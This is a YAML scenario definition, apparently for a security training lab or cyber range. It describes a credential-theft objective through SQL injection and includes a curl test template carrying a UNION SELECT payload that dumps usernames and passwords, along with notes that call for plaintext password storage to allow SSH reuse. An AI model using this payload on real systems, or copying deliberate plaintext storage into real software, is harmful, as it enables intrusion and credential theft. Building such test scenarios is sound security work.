id: credential_theft
description: >
  Extract plaintext or hashed credentials from the application database via a web
  vulnerability. The stolen credentials must match an OS user account, enabling
  subsequent SSH login.
compatible_vuln_patterns:
  - sqli_union
  - sqli_blind
success_criteria:
  description: >
    The attacker's request returns a response containing the target user's password
    — either as plaintext or as a recognisable hash (bcrypt, MD5, SHA1, etc.).
  output_pattern: '\$2[aby]\$|\$apr1\$|[a-f0-9]{32}|[a-f0-9]{40}|[A-Za-z0-9+/]{20,}'
test_template: |
  # UNION SELECT to pull username+password from users table
  curl -s "http://target:{{port}}/{{endpoint}}?{{input_parameter}}=x'+UNION+SELECT+username,password+FROM+users--+-" \
    | grep -iE '\$2[aby]\$|[a-f0-9]{32}|[a-f0-9]{40}|{{seed_username}}'
notes: >
  The seeded user's password must be stored in the DB (plaintext or hashed) and
  must exactly match the OS user account password so that SSH login works after
  credential extraction. Plaintext storage is simplest for demonstration purposes.
